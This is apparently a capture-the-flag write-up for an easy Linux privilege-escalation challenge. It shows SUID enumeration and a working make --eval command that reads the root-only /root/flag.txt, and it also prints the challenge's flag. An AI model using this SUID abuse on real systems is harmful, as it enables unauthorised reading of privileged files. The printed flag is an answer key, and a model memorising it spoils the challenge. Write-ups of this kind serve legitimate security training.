Event: NCA CTF  
Category: #Pentest #Very_Easy 

---

## ðŸ“Œ Challenge Information

- Points: 1050
    
- Difficulty: #Very_Easy
    
- Credentials :
    
    - Username: `ctfplayer`
        
    - Password: `ctfplayer`
        

---

## ðŸ“ Challenge Description

The challenge provided a Linux system where the user `ctfplayer` is logged in. The goal was to escalate privileges and read the root flag (`/root/flag.txt`). The system had some SUID binaries (`/usr/bin/make` and `/usr/bin/sudo`) and standard enumeration tools available.

---

# ðŸ”Ž Initial Enumeration

### Step 1 â€“ Check user and permissions

```bash
whoami
id
sudo -l
```

Observed: `ctfplayer` has no sudo permissions.

### Step 2 â€“ Look for SUID binaries

```bash
find / -type f -perm -4000 2>/dev/null
```

Found:

```
/usr/bin/make
/usr/bin/sudo
```

### Step 3 â€“ Inspect SUID binaries

```bash
ls -l /usr/bin/make
```

Output:

```
-rwsr-xr-x 1 root root 229088 Jun 22 2023 /usr/bin/make
```

Observation: `make` has SUID set (runs as root).

### Step 4 â€“ Attempt basic shell via make

```bash
make -s --eval=$'x:\n\t/bin/sh'
```

Result: got a shell, but still as `ctfplayer`.

### Step 5 â€“ Attempt to read root files

```bash
make -s --eval=$'x:\n\tcat /root/flag.txt'
```

Output: Permission denied.

---

## ðŸ‘€ Observations

- `/usr/bin/make` has the SUID bit set, meaning it can execute commands as root under certain conditions.
    
- Direct attempts to spawn `/bin/sh -p` failed (`illegal option -p`).
    
- Direct attempts to read `/root/flag.txt` with `cat` failed due to root-only permissions.
    

---

# ðŸš§ Problem Identified

The main trick in this challenge:

- **SUID binary exploitation**: `make` can execute shell commands, and the SUID property allows reading privileged files indirectly.
    
- Direct execution fails, but `make`â€™s `$(file ...)` function can be abused to read files as root.
    
- Permission issue prevents normal `cat` usage.
    
- Understanding GNU Make functions is key for SUID exploitation.
    

---

# ðŸ›  Exploitation / Solution

## Method Used

Used `make`â€™s `$(file < filename)` function to read the root flag. This works because `make` is SUID, so the `file` function is executed with root privileges.

```bash
make -s --eval='$(warning $(file < /root/flag.txt))'
```

**Explanation:**

- `$(file < /root/flag.txt)` reads the contents of the file.
    
- `$(warning â€¦)` prints the contents to stdout.
    
- SUID `make` allows reading root-only files without needing to spawn a shell.
    

---

## Alternative Method (If Any)

- Attempting `/bin/sh -p` directly failed due to shell restrictions.
    
- Using `cat /root/flag.txt` in `make` recipes failed because it ran as `ctfplayer`.
    

The `$(file < â€¦)` method was the reliable SUID exploit.

---

# ðŸ“¤ Command Used to Retrieve the Flag

```bash
make -s --eval='$(warning $(file < /root/flag.txt))'
```

Output:

```
make[1]: NCA{5UiD_is_V3rY_lmP0rT4Nt_P3rmiS5lon_0a74bbab688b}
```

---

# ðŸš© Final Flag

```
NCA{5UiD_is_V3rY_lmP0rT4Nt_P3rmiS5lon_0a74bbab688b}
```

---

# ðŸ§  Key Takeaways

- SUID binaries can be exploited using unexpected features like `make` functions.
    
- Not all privilege escalation requires spawning a shell; sometimes reading files directly is enough.
    
- Knowing GNU Make functions and syntax is useful for Linux CTFs.
    
- Always enumerate SUID files early in privilege escalation challenges.
    

---

# ðŸ“š Skills Practiced

- Linux Enumeration
    
- SUID Privilege Escalation
    
- Shell Argument Parsing
    
- GNU Make Function Exploitation
    
- File Handling & Permissions
    
- Problem-Solving Strategy
    

---

# ðŸ Personal Reflection

Next time, I would immediately check `make`â€™s built-in functions for SUID exploitation instead of repeatedly trying shell commands. Understanding tool features can save a lot of time in privilege escalation challenges.
